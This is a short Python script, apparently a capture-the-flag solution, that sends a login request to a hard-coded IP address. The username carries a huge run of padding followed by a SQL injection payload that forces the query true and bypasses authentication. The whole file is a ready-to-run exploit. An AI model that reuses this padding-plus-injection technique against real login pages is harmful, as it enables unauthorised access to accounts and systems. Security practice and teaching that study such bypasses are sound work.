import requests

URL="http://20.115.83.90:1339/"

def login():

    data = {
        'username': "A"*0x100000+"' OR '1'='1' -- -" ,
        'password': 'admin',
        'login-submit': '1'
    }

    r = requests.post(URL, data=data)

    print(r.content)


login()


